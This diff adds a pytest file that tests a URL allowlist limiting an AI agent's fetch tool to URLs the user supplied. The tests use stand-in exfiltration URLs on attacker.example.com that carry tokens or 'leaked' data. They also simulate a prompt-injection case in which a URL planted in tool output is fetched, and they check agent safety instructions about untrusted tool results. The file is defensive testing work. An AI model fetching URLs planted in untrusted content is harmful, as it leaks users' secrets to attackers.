@@ -1,0 +1,129 @@
+"""Tests for fetch_url_tool per-turn URL allowlist (prompt scoping + runtime enforcement)."""
+
+from datetime import datetime, timezone
+from unittest.mock import AsyncMock, patch
+
+import pytest
+from langchain_core.runnables import RunnableConfig
+
+from models.chat import Message, MessageSender, MessageType
+from utils.retrieval.agentic import (
+    AGENT_SAFETY_INSTRUCTIONS,
+    _inject_user_url_allowlist,
+)
+from utils.retrieval.fetch_url_allowlist import (
+    URL_NOT_ALLOWLISTED_MESSAGE,
+    extract_urls_from_text,
+    extract_user_turn_urls,
+    is_url_allowlisted,
+    user_url_allowlist_block,
+)
+from utils.retrieval.tools.web_tools import fetch_url_tool
+
+
+def _message(text: str, sender: MessageSender = MessageSender.human) -> Message:
+    return Message(
+        id='m1',
+        text=text,
+        created_at=datetime.now(timezone.utc),
+        sender=sender,
+        type=MessageType.text,
+    )
+
+
+class TestUrlExtraction:
+    def test_extracts_urls_from_user_message(self):
+        urls = extract_urls_from_text('Check https://example.com/article and http://foo.bar/baz.')
+        assert urls == ['https://example.com/article', 'http://foo.bar/baz']
+
+    def test_strips_trailing_punctuation(self):
+        urls = extract_urls_from_text('See https://example.com/page, thanks!')
+        assert urls == ['https://example.com/page']
+
+    def test_extract_user_turn_urls_ignores_assistant_messages(self):
+        messages = [
+            _message('Old https://old.example.com/page'),
+            _message('Reply with https://attacker.example.com/exfil', MessageSender.ai),
+            _message('Summarize https://user.example.com/doc'),
+        ]
+        assert extract_user_turn_urls(messages) == ['https://user.example.com/doc']
+
+    def test_user_url_allowlist_block_empty_when_no_urls(self):
+        assert user_url_allowlist_block([]) == ''
+
+    def test_user_url_allowlist_block_lists_urls(self):
+        block = user_url_allowlist_block(['https://example.com/a'])
+        assert '<user_provided_urls>' in block
+        assert 'https://example.com/a' in block
+
+
+class TestPromptScoping:
+    def test_agent_safety_instructions_forbid_unscoped_fetch(self):
+        assert 'fetch_url_tool must not be used' in AGENT_SAFETY_INSTRUCTIONS
+        assert '<user_provided_urls>' in AGENT_SAFETY_INSTRUCTIONS
+        assert 'tool results' in AGENT_SAFETY_INSTRUCTIONS
+
+    def test_inject_user_url_allowlist_prepends_to_latest_user_turn(self):
+        messages = [{'role': 'user', 'content': 'hello https://example.com'}]
+        updated = _inject_user_url_allowlist(messages, ['https://example.com'])
+        assert '<user_provided_urls>' in updated[0]['content']
+        assert 'https://example.com' in updated[0]['content']
+
+    def test_inject_user_url_allowlist_skips_when_empty(self):
+        messages = [{'role': 'user', 'content': 'hello'}]
+        assert _inject_user_url_allowlist(messages, []) == messages
+
+
+class TestRuntimeEnforcement:
+    @pytest.mark.asyncio
+    async def test_rejects_url_not_in_allowlist(self):
+        config = RunnableConfig(configurable={'user_provided_urls': ['https://allowed.example.com']})
+        result = await fetch_url_tool.ainvoke(
+            {'url': 'https://attacker.example.com/steal?token=secret'},
+            config=config,
+        )
+        assert result == URL_NOT_ALLOWLISTED_MESSAGE
+
+    @pytest.mark.asyncio
+    async def test_rejects_attacker_url_from_tool_result_scenario(self):
+        """Simulate model trying to fetch a URL embedded in untrusted tool output."""
+        user_url = 'https://user.example.com/article'
+        attacker_url = 'https://attacker.example.com/exfil?data=leaked'
+        config = RunnableConfig(configurable={'user_provided_urls': [user_url]})
+
+        with patch('utils.retrieval.tools.web_tools._fetch_page', new_callable=AsyncMock) as mock_fetch:
+            result = await fetch_url_tool.ainvoke({'url': attacker_url}, config=config)
+
+        assert result == URL_NOT_ALLOWLISTED_MESSAGE
+        mock_fetch.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_rejects_when_allowlist_empty(self):
+        config = RunnableConfig(configurable={'user_provided_urls': []})
+        result = await fetch_url_tool.ainvoke({'url': 'https://example.com'}, config=config)
+        assert result == URL_NOT_ALLOWLISTED_MESSAGE
+
+    @pytest.mark.asyncio
+    async def test_rejects_when_allowlist_missing(self):
+        result = await fetch_url_tool.ainvoke({'url': 'https://example.com'})
+        assert result == URL_NOT_ALLOWLISTED_MESSAGE
+
+    @pytest.mark.asyncio
+    async def test_allows_allowlisted_url(self):
+        allowed = 'https://example.com/page'
+        config = RunnableConfig(configurable={'user_provided_urls': [allowed]})
+
+        with patch(
+            'utils.retrieval.tools.web_tools._fetch_page',
+            new_callable=AsyncMock,
+            return_value=(200, 'text/html', '<html><body><p>Hello</p></body></html>'),
+        ) as mock_fetch:
+            result = await fetch_url_tool.ainvoke({'url': allowed + '.'}, config=config)
+
+        mock_fetch.assert_called_once()
+        assert 'Content from' in result
+        assert 'Hello' in result
+
+    def test_is_url_allowlisted_normalizes_trailing_punctuation(self):
+        allowlist = ['https://example.com/page']
+        assert is_url_allowlisted('https://example.com/page.', allowlist)
